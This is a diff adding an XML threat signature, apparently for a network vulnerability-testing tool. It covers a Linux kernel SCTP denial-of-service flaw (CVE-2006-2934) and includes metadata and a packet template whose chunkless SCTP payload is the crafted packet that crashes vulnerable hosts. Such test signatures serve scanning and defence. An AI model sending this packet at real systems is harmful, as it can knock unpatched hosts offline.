@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Linux Kernel SCTP Chunkless Packet Denial of Service"/>
+    <EngDesc display="true" value="There exists a remote denial of service vulnerability in the Linux Kernel. The vulnerability occurs due to insufficient checks during the processing of SCTP packets by the netfilter module, namely those without any Chunk elements. By sending a crafted SCTP packet to a target host, an attacker may exploit this vulnerability to shut down a vulnerable host, thus creating a system wide denial of service condition."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="SCTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Linux"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Linux_kernel"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Linux_kernel_2.6.17.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20060704-16"/>
+    <CVEID display="true" value="CVE-2006-2934"/>
+    <bugtraqID display="true" value="18755"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="45b747cda4e6f292fb8ae80af8ff30c4"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633382113501296250"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1203707051" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="E">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="E" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="84" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" Payload="03E7007B0000000026194352" CE="" DF="" MF=""/>
+    </Ethernet>
+  </Output>
+  <Stateful display="false" value="false"/>
+  <DestIPVarName display="false" value="$destIP"/>
+</threatSignature>
